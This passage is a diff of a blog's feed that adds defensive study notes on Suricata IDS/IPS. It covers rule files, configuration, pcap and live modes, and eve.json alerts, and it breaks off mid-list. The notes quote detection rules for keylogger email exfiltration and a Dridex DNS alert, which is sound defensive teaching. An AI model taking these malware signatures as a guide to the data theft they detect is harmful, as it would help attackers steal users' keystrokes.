@@ -1,5 +1,1586 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2024-06-29T22:10:09-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Armando Villalobos</title><subtitle>Cybersecurity enthusiast
-</subtitle><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><entry><title type="html">Introduction to Networks</title><link href="http://localhost:4000/blog/notes/2024-06-28-introductionToNetworks/" rel="alternate" type="text/html" title="Introduction to Networks" /><published>2024-06-28T00:00:00-06:00</published><updated>2024-06-28T00:00:00-06:00</updated><id>http://localhost:4000/blog/notes/introductionToNetworks</id><content type="html" xml:base="http://localhost:4000/blog/notes/2024-06-28-introductionToNetworks/"><![CDATA[<ul id="markdown-toc">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2024-08-16T15:49:24-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Armando Villalobos</title><subtitle>Cybersecurity enthusiast
+</subtitle><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><entry><title type="html">Introduction to IDS/IPS</title><link href="http://localhost:4000/blog/notes/2024-08-12-IntroductionToIDSAndIPS/" rel="alternate" type="text/html" title="Introduction to IDS/IPS" /><published>2024-08-12T00:00:00-06:00</published><updated>2024-08-12T00:00:00-06:00</updated><id>http://localhost:4000/blog/notes/IntroductionToIDSAndIPS</id><content type="html" xml:base="http://localhost:4000/blog/notes/2024-08-12-IntroductionToIDSAndIPS/"><![CDATA[<ul id="markdown-toc">
+  <li><a href="#suricata" id="markdown-toc-suricata">Suricata</a>    <ul>
+      <li><a href="#outputs" id="markdown-toc-outputs">Outputs</a></li>
+      <li><a href="#file-extraction-with-suricata" id="markdown-toc-file-extraction-with-suricata">File extraction with suricata+</a></li>
+      <li><a href="#suricata-rule-development" id="markdown-toc-suricata-rule-development">Suricata Rule Development</a>        <ul>
+          <li><a href="#example-1" id="markdown-toc-example-1">Example 1</a></li>
+          <li><a href="#example-2" id="markdown-toc-example-2">Example 2</a></li>
+          <li><a href="#example-3" id="markdown-toc-example-3">Example 3</a></li>
+        </ul>
+      </li>
+      <li><a href="#suricata-rule-development-encrypted-traffic" id="markdown-toc-suricata-rule-development-encrypted-traffic">Suricata Rule Development (Encrypted Traffic)</a>        <ul>
+          <li><a href="#example-4" id="markdown-toc-example-4">Example 4</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><a href="#snort" id="markdown-toc-snort">Snort</a>    <ul>
+      <li><a href="#snort-rules" id="markdown-toc-snort-rules">Snort Rules</a></li>
+      <li><a href="#snort-outputs" id="markdown-toc-snort-outputs">Snort Outputs</a></li>
+      <li><a href="#example-1-1" id="markdown-toc-example-1-1">Example 1</a></li>
+      <li><a href="#example-2-1" id="markdown-toc-example-2-1">Example 2</a></li>
+      <li><a href="#example-3-1" id="markdown-toc-example-3-1">Example 3</a></li>
+      <li><a href="#example-4-1" id="markdown-toc-example-4-1">Example 4</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="suricata">Suricata</h2>
+
+<p>The IDS operates in two main modes: signature-based detection and anomaly-based detection. In signature-based detection, the IDS recognizes bad patterns, such as malware signatures and previously identified attack patterns. However, this method is limited to only known threats. For this reason, we also implement anomaly-based detection, which establishes a baseline of normal behavior and sends an alert when it detects behavior deviating from this baseline. It’s a more proactive approach but is susceptible to false positives, hence why we use both methods to balance each other out.</p>
+
+<p>An IPS also operates in a similar mode to IDS, offering both signature-based and anomaly-based detection. Once a potential threat is detected, it takes actions such as dropping malicious packets, blocking network traffic, and resetting the connection. The goal is to interrupt or halt activities that are deemed dangerous to our network or against our policy.</p>
+
+<p>We can modify or add new rules to suricate software</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span> /etc/suricata/rules/
+total 27M
+drwxr-xr-x 2 root root 4.0K Jun 28 12:10 <span class="nb">.</span>
+drwxr-xr-x 3 root root 4.0K Jul  4 14:44 ..
+<span class="nt">-rw-r--r--</span> 1 root root  31K Jun 27 20:55 3coresec.rules
+<span class="nt">-rw-r--r--</span> 1 root root 1.9K Jun 15 05:51 app-layer-events.rules
+<span class="nt">-rw-r--r--</span> 1 root root 2.1K Jun 27 20:55 botcc.portgrouped.rules
+<span class="nt">-rw-r--r--</span> 1 root root  27K Jun 27 20:55 botcc.rules
+<span class="nt">-rw-r--r--</span> 1 root root 109K Jun 27 20:55 ciarmy.rules
+<span class="nt">-rw-r--r--</span> 1 root root  12K Jun 27 20:55 compromised.rules
+<span class="nt">-rw-r--r--</span> 1 root root  21K Jun 15 05:51 decoder-events.rules
+<span class="nt">-rw-r--r--</span> 1 root root  468 Jun 15 05:51 dhcp-events.rules
+<span class="nt">-rw-r--r--</span> 1 root root 1.2K Jun 15 05:51 dnp3-events.rules
+<span class="nt">-rw-r--r--</span> 1 root root 1.2K Jun 15 05:51 dns-events.rules
+<span class="nt">-rw-r--r--</span> 1 root root  32K Jun 27 20:55 drop.rules
+<span class="nt">-rw-r--r--</span> 1 root root 2.7K Jun 27 20:55 dshield.rules
+<span class="nt">-rw-r--r--</span> 1 root root 365K Jun 27 20:55 emerging-activex.rules
+<span class="nt">-rw-r--r--</span> 1 root root 613K Jun 27 20:55 emerging-adware_pup.rules
+<span class="nt">-rw-r--r--</span> 1 root root 650K Jun 27 20:55 emerging-attack_response.rules
+<span class="nt">-rw-r--r--</span> 1 root root  33K Jun 27 20:55 emerging-chat.rules
+<span class="nt">-rw-r--r--</span> 1 root root  19K Jun 27 20:55 emerging-coinminer.rules
+<span class="nt">-rw-r--r--</span> 1 root root 119K Jun 27 20:55 emerging-current_events.rules
+<span class="nt">-rw-r--r--</span> 1 root root 1.7M Jun 27 20:55 emerging-deleted.rules
+<span class="nt">-rw-r--r--</span> 1 root root  20K Jun 27 20:55 emerging-dns.rules
+<span class="nt">-rw-r--r--</span> 1 root root  62K Jun 27 20:55 emerging-dos.rules
+<span class="nt">-rw-r--r--</span> 1 root root 606K Jun 27 20:55 emerging-exploit_kit.rules
+<span class="nt">-rw-r--r--</span> 1 root root 1.1M Jun 27 20:55 emerging-exploit.rules
+<span class="nt">-rw-r--r--</span> 1 root root  45K Jun 27 20:55 emerging-ftp.rules
+<span class="nt">-rw-r--r--</span> 1 root root  37K Jun 27 20:55 emerging-games.rules
+<span class="nt">-rw-r--r--</span> 1 root root 572K Jun 27 20:55 emerging-hunting.rules
+<span class="nt">-rw-r--r--</span> 1 root root  18K Jun 27 20:55 emerging-icmp_info.rules
+<span class="nt">-rw-r--r--</span> 1 root root  11K Jun 27 20:55 emerging-icmp.rules
+<span class="nt">-rw-r--r--</span> 1 root root  15K Jun 27 20:55 emerging-imap.rules
+<span class="nt">-rw-r--r--</span> 1 root root  11K Jun 27 20:55 emerging-inappropriate.rules
+<span class="nt">-rw-r--r--</span> 1 root root 2.9M Jun 27 20:55 emerging-info.rules
+<span class="nt">-rw-r--r--</span> 1 root root  48K Jun 27 20:55 emerging-ja3.rules
+<span class="nt">-rw-r--r--</span> 1 root root 8.2M Jun 27 20:55 emerging-malware.rules
+<span class="nt">---SNIP---</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span>more /etc/suricata/rules/emerging-malware.rules
+<span class="c"># Emerging Threats</span>
+<span class="c">#</span>
+<span class="c"># This distribution may contain rules under two different licenses.</span>
+<span class="c">#</span>
+<span class="c">#  Rules with sids 1 through 3464, and 100000000 through 100000908 are under the GPLv2.</span>
+<span class="c">#  A copy of that license is available at http://www.gnu.org/licenses/gpl-2.0.html</span>
+<span class="c">#</span>
+<span class="c">#  Rules with sids 2000000 through 2799999 are from Emerging Threats and are covered under the BSD License</span>
+<span class="c">#  as follows:</span>
+<span class="c">#</span>
+<span class="c">#*************************************************************</span>
+<span class="c">#  Copyright (c) 2003-2022, Emerging Threats</span>
+<span class="c">#  All rights reserved.</span>
+<span class="c">#</span>
+<span class="c">#  Redistribution and use in source and binary forms, with or without modification, are permitted provided that the</span>
+<span class="c">#  following conditions are met:</span>
+<span class="c">#</span>
+<span class="c">#  * Redistributions of source code must retain the above copyright notice, this list of conditions and the following</span>
+<span class="c">#    disclaimer.</span>
+<span class="c">#  * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the</span>
+<span class="c">#    following disclaimer in the documentation and/or other materials provided with the distribution.</span>
+<span class="c">#  * Neither the name of the nor the names of its contributors may be used to endorse or promote products derived</span>
+<span class="c">#    from this software without specific prior written permission.</span>
+<span class="c">#</span>
+<span class="c">#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED WARRANTIES,</span>
+<span class="c">#  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span>
+<span class="c">#  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,</span>
+<span class="c">#  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span>
+<span class="c">#  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,</span>
+<span class="c">#  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE</span>
+<span class="c">#  USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span>
+<span class="c">#</span>
+<span class="c">#*************************************************************</span>
+<span class="c">#</span>
+<span class="c">#</span>
+<span class="c">#</span>
+<span class="c">#</span>
+
+<span class="c"># This Ruleset is EmergingThreats Open optimized for suricata-5.0-enhanced.</span>
+
+<span class="c">#alert tcp $HOME_NET any -&gt; $EXTERNAL_NET any (msg:"ET MALWARE Psyb0t joining an IRC Channel"; flow:established,to_server; flowbits:isset,is_proto_irc; content:"</span>
+JOIN <span class="c">#mipsel"; reference:url,www.adam.com.au/bogaurd/PSYB0T.pdf; reference:url,doc.emergingthreats.net/2009172; classtype:trojan-activity; sid:2009172; rev:2; me</span>
+tadata:created_at 2010_07_30, updated_at 2010_07_30<span class="p">;</span><span class="o">)</span>
+
+alert tcp <span class="nv">$HOME_NET</span> any -&gt; <span class="nv">$EXTERNAL_NET</span> 25 <span class="o">(</span>msg:<span class="s2">"ET MALWARE SC-KeyLog Keylogger Installed - Sending Initial Email Report"</span><span class="p">;</span> flow:established,to_server<span class="p">;</span> content:<span class="s2">"
+Installation of SC-KeyLog on host "</span><span class="p">;</span> nocase<span class="p">;</span> content:<span class="s2">"&lt;p&gt;You will receive a log report every "</span><span class="p">;</span> nocase<span class="p">;</span> reference:url,www.soft-central.net/keylog.php<span class="p">;</span> reference:
+url,doc.emergingthreats.net/2002979<span class="p">;</span> classtype:trojan-activity<span class="p">;</span> sid:2002979<span class="p">;</span> rev:4<span class="p">;</span> metadata:created_at 2010_07_30, updated_at 2010_07_30<span class="p">;</span><span class="o">)</span>
+
+alert tcp <span class="nv">$HOME_NET</span> any -&gt; <span class="nv">$EXTERNAL_NET</span> 25 <span class="o">(</span>msg:<span class="s2">"ET MALWARE SC-KeyLog Keylogger Installed - Sending Log Email Report"</span><span class="p">;</span> flow:established,to_server<span class="p">;</span> content:<span class="s2">"SC-K
+eyLog log report"</span><span class="p">;</span> nocase<span class="p">;</span> content:<span class="s2">"See attached file"</span><span class="p">;</span> nocase<span class="p">;</span> content:<span class="s2">".log"</span><span class="p">;</span> nocase<span class="p">;</span> reference:url,www.soft-central.net/keylog.php<span class="p">;</span> reference:url,doc.emerging
+threats.net/2008348<span class="p">;</span> classtype:trojan-activity<span class="p">;</span> sid:2008348<span class="p">;</span> rev:2<span class="p">;</span> metadata:created_at 2010_07_30, updated_at 2010_07_30<span class="p">;</span><span class="o">)</span>
+<span class="nt">---SNIP---</span>
+</code></pre></div></div>
+
+<p>Also we can add some configuration to suricata.</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">gu3ro@htb[/htb]$ more /etc/suricata/suricata.yaml</span>
+<span class="err">%</span><span class="s">YAML </span><span class="m">1.1</span>
+<span class="nn">---</span>
+
+<span class="c1"># Suricata configuration file. In addition to the comments describing all</span>
+<span class="c1"># options in this file, full documentation can be found at:</span>
+<span class="c1"># https://suricata.readthedocs.io/en/latest/configuration/suricata-yaml.html</span>
+
+<span class="c1"># This configuration file generated by Suricata 6.0.13.</span>
+<span class="na">suricata-version</span><span class="pi">:</span> <span class="s2">"</span><span class="s">6.0"</span>
+
+<span class="c1">##</span>
+<span class="c1">## Step 1: Inform Suricata about your network</span>
+<span class="c1">##</span>
+
+<span class="na">vars</span><span class="pi">:</span>
+  <span class="c1"># more specific is better for alert accuracy and performance</span>
+  <span class="na">address-groups</span><span class="pi">:</span>
+    <span class="na">HOME_NET</span><span class="pi">:</span> <span class="s2">"</span><span class="s">[10.0.0.0/8]"</span>
+    <span class="c1">#HOME_NET: "[192.168.0.0/16]"</span>
+    <span class="c1">#HOME_NET: "[10.0.0.0/8]"</span>
+    <span class="c1">#HOME_NET: "[172.16.0.0/12]"</span>
+    <span class="c1">#HOME_NET: "any"</span>
+
+    <span class="na">EXTERNAL_NET</span><span class="pi">:</span> <span class="s2">"</span><span class="s">!$HOME_NET"</span>
+    <span class="c1">#EXTERNAL_NET: "any"</span>
+
+    <span class="na">HTTP_SERVERS</span><span class="pi">:</span> <span class="s2">"</span><span class="s">$HOME_NET"</span>
+    <span class="na">SMTP_SERVERS</span><span class="pi">:</span> <span class="s2">"</span><span class="s">$HOME_NET"</span>
+    <span class="na">SQL_SERVERS</span><span class="pi">:</span> <span class="s2">"</span><span class="s">$HOME_NET"</span>
+    <span class="na">DNS_SERVERS</span><span class="pi">:</span> <span class="s2">"</span><span class="s">$HOME_NET"</span>
+    <span class="na">TELNET_SERVERS</span><span class="pi">:</span> <span class="s2">"</span><span class="s">$HOME_NET"</span>
+    <span class="na">AIM_SERVERS</span><span class="pi">:</span> <span class="s2">"</span><span class="s">$EXTERNAL_NET"</span>
+    <span class="na">DC_SERVERS</span><span class="pi">:</span> <span class="s2">"</span><span class="s">$HOME_NET"</span>
+    <span class="na">DNP3_SERVER</span><span class="pi">:</span> <span class="s2">"</span><span class="s">$HOME_NET"</span>
+<span class="s">---SNIP---</span>
+</code></pre></div></div>
+
+<p>We can use suricate to inspect a pcap file with this command</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span>suricata <span class="nt">-r</span> /home/htb-student/pcaps/suspicious.pcap <span class="nt">-k</span> none <span class="nt">-l</span> <span class="nb">.</span>
+5/7/2023 <span class="nt">--</span> 13:37:43 - &lt;Notice&gt; - This is Suricata version 6.0.13 RELEASE running <span class="k">in </span>USER mode
+5/7/2023 <span class="nt">--</span> 13:37:43 - &lt;Notice&gt; - all 3 packet processing threads, 4 management threads initialized, engine started.
+5/7/2023 <span class="nt">--</span> 13:37:43 - &lt;Notice&gt; - Signal Received.  Stopping engine.
+5/7/2023 <span class="nt">--</span> 13:37:43 - &lt;Notice&gt; - Pcap-file module <span class="nb">read </span>1 files, 5172 packets, 3941260 bytes
+</code></pre></div></div>
+
+<p>Or we can do it live with this one</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>suricata <span class="nt">--pcap</span><span class="o">=</span>ens160 <span class="nt">-vv</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>htb-student:
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Notice&gt; - This is Suricata version 6.0.13 RELEASE running <span class="k">in </span>SYSTEM mode
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - CPUs/cores online: 2
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - Setting engine mode to IDS mode by default
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - Found an MTU of 1500 <span class="k">for</span> <span class="s1">'ens160'</span>
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - Found an MTU of 1500 <span class="k">for</span> <span class="s1">'ens160'</span>
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - fast output device <span class="o">(</span>regular<span class="o">)</span> initialized: fast.log
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - eve-log output device <span class="o">(</span>regular<span class="o">)</span> initialized: eve.json
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - stats output device <span class="o">(</span>regular<span class="o">)</span> initialized: stats.log
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - Running <span class="k">in </span>live mode, activating unix socket
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - using shared mpm ctx<span class="s1">' for http_uri
+5/7/2023 -- 13:44:01 - &lt;Perf&gt; - using shared mpm ctx'</span> <span class="k">for </span>http_uri
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - using shared mpm ctx<span class="s1">' for http_raw_uri
+5/7/2023 -- 13:44:01 - &lt;Perf&gt; - using shared mpm ctx'</span> <span class="k">for </span>http_raw_uri
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - 1 rule files processed. 1 rules successfully loaded, 0 rules failed
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - Threshold config parsed: 0 rule<span class="o">(</span>s<span class="o">)</span> found
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - using shared mpm ctx<span class="s1">' for tcp-packet
+5/7/2023 -- 13:44:01 - &lt;Perf&gt; - using shared mpm ctx'</span> <span class="k">for </span>tcp-stream
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - using shared mpm ctx<span class="s1">' for udp-packet
+5/7/2023 -- 13:44:01 - &lt;Perf&gt; - using shared mpm ctx'</span> <span class="k">for </span>other-ip
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - 1 signatures processed. 0 are IP-only rules, 0 are inspecting packet payload, 1 inspect application layer, 0 are decoder event only
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - TCP toserver: 1 port <span class="nb">groups</span>, 1 unique SGH<span class="s1">'s, 0 copies
+5/7/2023 -- 13:44:01 - &lt;Perf&gt; - TCP toclient: 0 port groups, 0 unique SGH'</span>s, 0 copies
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - UDP toserver: 1 port <span class="nb">groups</span>, 1 unique SGH<span class="s1">'s, 0 copies
+5/7/2023 -- 13:44:01 - &lt;Perf&gt; - UDP toclient: 0 port groups, 0 unique SGH'</span>s, 0 copies
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - OTHER toserver: 0 proto <span class="nb">groups</span>, 0 unique SGH<span class="s1">'s, 0 copies
+5/7/2023 -- 13:44:01 - &lt;Perf&gt; - OTHER toclient: 0 proto groups, 0 unique SGH'</span>s, 0 copies
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - Unique rule <span class="nb">groups</span>: 2
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - Builtin MPM <span class="s2">"toserver TCP packet"</span>: 0
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - Builtin MPM <span class="s2">"toclient TCP packet"</span>: 0
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - Builtin MPM <span class="s2">"toserver TCP stream"</span>: 0
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - Builtin MPM <span class="s2">"toclient TCP stream"</span>: 0
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - Builtin MPM <span class="s2">"toserver UDP packet"</span>: 0
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - Builtin MPM <span class="s2">"toclient UDP packet"</span>: 0
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - Builtin MPM <span class="s2">"other IP packet"</span>: 0
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - AppLayer MPM <span class="s2">"toserver dns_query (dns)"</span>: 1
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - Using 1 live device<span class="o">(</span>s<span class="o">)</span><span class="nb">.</span>
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - using interface ens160
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - ens160: disabling rxcsum offloading
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - ens160: disabling txcsum offloading
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - running <span class="k">in</span> <span class="s1">'auto'</span> checksum mode. Detection of interface state will require 1000ULL packets
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - Found an MTU of 1500 <span class="k">for</span> <span class="s1">'ens160'</span>
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - Set snaplen to 1524 <span class="k">for</span> <span class="s1">'ens160'</span>
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - NIC offloading on ens160: RX <span class="nb">unset </span>TX <span class="nb">unset
+</span>5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Perf&gt; - NIC offloading on ens160: SG: <span class="nb">unset</span>, GRO: <span class="nb">unset</span>, LRO: <span class="nb">unset</span>, TSO: <span class="nb">unset</span>, GSO: <span class="nb">unset
+</span>5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - RunModeIdsPcapAutoFp initialised
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - Running <span class="k">in </span>live mode, activating unix socket
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Info&gt; - Using unix socket file <span class="s1">'/var/run/suricata/suricata-command.socket'</span>
+5/7/2023 <span class="nt">--</span> 13:44:01 - &lt;Notice&gt; - all 3 packet processing threads, 4 management threads initialized, engine started.
+</code></pre></div></div>
+
+<p>We can use suricata in IDS mode with these commands</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>suricata <span class="nt">-i</span> ens160
+5/7/2023 <span class="nt">--</span> 13:53:35 - &lt;Notice&gt; - This is Suricata version 6.0.13 RELEASE running <span class="k">in </span>SYSTEM mode
+5/7/2023 <span class="nt">--</span> 13:53:35 - &lt;Notice&gt; - all 1 packet processing threads, 4 management threads initialized, engine started.
+  
+gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>suricata <span class="nt">--af-packet</span><span class="o">=</span>ens160
+5/7/2023 <span class="nt">--</span> 13:54:34 - &lt;Notice&gt; - This is Suricata version 6.0.13 RELEASE running <span class="k">in </span>SYSTEM mode
+5/7/2023 <span class="nt">--</span> 13:54:34 - &lt;Notice&gt; - all 1 packet processing threads, 4 management threads initialized, engine started.
+</code></pre></div></div>
+
+<h3 id="outputs">Outputs</h3>
+
+<ul>
+  <li>eve.json: This file is Suricata’s recommended output and contains JSON objects, each carrying diverse information such as timestamps, flow_id, event_type, and more.</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">cat</span> /var/log/suricata/old_eve.json | jq <span class="nt">-c</span> <span class="s1">'select(.event_type == "alert")'</span>
+<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2023-07-06T08:34:35.003163+0000"</span>,<span class="s2">"flow_id"</span>:1959965318909019,<span class="s2">"in_iface"</span>:<span class="s2">"ens160"</span>,<span class="s2">"event_type"</span>:<span class="s2">"alert"</span>,<span class="s2">"src_ip"</span>:<span class="s2">"10.9.24.101"</span>,<span class="s2">"src_port"</span>:51833,<span class="s2">"d est_ip"</span>:<span class="s2">"10.9.24.1"</span>,<span class="s2">"dest_port"</span>:53,<span class="s2">"proto"</span>:<span class="s2">"UDP"</span>,<span class="s2">"tx_id"</span>:0,<span class="s2">"alert"</span>:<span class="o">{</span><span class="s2">"action"</span>:<span class="s2">"allowed"</span>,<span class="s2">"gid"</span>:1,<span class="s2">"signature_id"</span>:1,<span class="s2">"rev"</span>:0,<span class="s2">"signature"</span>:<span class="s2">"Known bad DNS lookup, possible Dridex infection"</span>,<span class="s2">"category"</span>:<span class="s2">""</span>,<span class="s2">"severity"</span>:3<span class="o">}</span>,<span class="s2">"dns"</span>:<span class="o">{</span><span class="s2">"query"</span>:[<span class="o">{</span><span class="s2">"type"</span>:<span class="s2">"query"</span>,<span class="s2">"id"</span>:6430,<span class="s2">"rrname"</span>:<span class="s2">"adv.epostoday.uk"</span>,<span class="s2">"rrtype"</span>:<span class="s2">"A"</span>,<span class="s2">"tx_id"</span>:0,<span class="s2">"opcode"</span>:0<span class="o">}</span>    <span class="o">]}</span>,<span class="s2">"app_proto"</span>:<span class="s2">"dns"</span>,<span class="s2">"flow"</span>:<span class="o">{</span><span class="s2">"pkts_toserver"</span>:1,<span class="s2">"pkts_toclient"</span>:0,<span class="s2">"bytes_toserver"</span>:76,<span class="s2">"bytes_toclient"</span>:0,<span class="s2">"start"</span>:<span class="s2">"2023-07-06T08:34:35.003163+0000"</span><span class="o">}}</span>
+</code></pre></div></div>
+
+<p>If we wish to identify the earliest DNS event, for example, we can utilize the jq command-line JSON processor as follows.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">cat</span> /var/log/suricata/old_eve.json | jq <span class="nt">-c</span> <span class="s1">'select(.event_type == "dns")'</span> | <span class="nb">head</span> <span class="nt">-1</span> | jq <span class="nb">.</span>
+<span class="o">{</span>
+ <span class="s2">"timestamp"</span>: <span class="s2">"2023-07-06T08:34:35.003163+0000"</span>,
+ <span class="s2">"flow_id"</span>: 1959965318909019,
+ <span class="s2">"in_iface"</span>: <span class="s2">"ens160"</span>,
+  <span class="s2">"event_type"</span>: <span class="s2">"dns"</span>,
+  <span class="s2">"src_ip"</span>: <span class="s2">"10.9.24.101"</span>,
+ <span class="s2">"src_port"</span>: 51833,
+ <span class="s2">"dest_ip"</span>: <span class="s2">"10.9.24.1"</span>,
+ <span class="s2">"dest_port"</span>: 53,
+ <span class="s2">"proto"</span>: <span class="s2">"UDP"</span>,
+ <span class="s2">"dns"</span>: <span class="o">{</span>
+  <span class="s2">"type"</span>: <span class="s2">"query"</span>,
+  <span class="s2">"id"</span>: 6430,
+   <span class="s2">"rrname"</span>: <span class="s2">"adv.epostoday.uk"</span>,
+   <span class="s2">"rrtype"</span>: <span class="s2">"A"</span>,
+   <span class="s2">"tx_id"</span>: 0,
+  <span class="s2">"opcode"</span>: 0
+ <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<hr />
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">flow_id</code>: This is a unique identifier assigned by Suricata to each network flow. A flow, in Suricata terms, is defined as a set of IP packets passing through a network interface in a specific direction and between a given pair of source and destination endpoints. Each of these flows gets a unique flow_id. This identifier helps us track and correlate various events related to the same network flow in the EVE JSON log. Using flow_id, we can associate different pieces of information related to the same flow, such as alerts, network transactions, and packets, providing a cohesive view of what is happening on a specific communication channel.*</li>
+  <li><code class="language-plaintext highlighter-rouge">pcap_cnt</code>: This is a counter that Suricata increments for each packet it processes from the network traffic or from a PCAP file (in offline mode). pcap_cnt allows us to trace a packet back to its original order in the PCAP file or network stream. This is beneficial in understanding the sequence of network events as they occurred. It can help to precisely pinpoint when an alert was triggered in relation to other packets, which can provide valuable context in an investigation.*</li>
+  <li><code class="language-plaintext highlighter-rouge">fast.log</code>: This is a text-based log format that records alerts only and is enabled by default. Try inspecting the content of old_fast.log residing at /var/log/suricata as follows.</li>
+</ul>
+
+<hr />
+
+<blockquote>
+  <ul>
+    <li><em>flow_id: This is a unique identifier assigned by Suricata to each network flow. A flow, in Suricata terms, is defined as a set of IP packets passing through a network interface in a specific direction and between a given pair of source and destination endpoints. Each of these flows gets a unique flow_id. This identifier helps us track and correlate various events related to the same network flow in the EVE JSON log. Using flow_id, we can associate different pieces of information related to the same flow, such as alerts, network transactions, and packets, providing a cohesive view of what is happening on a specific communication channel.</em></li>
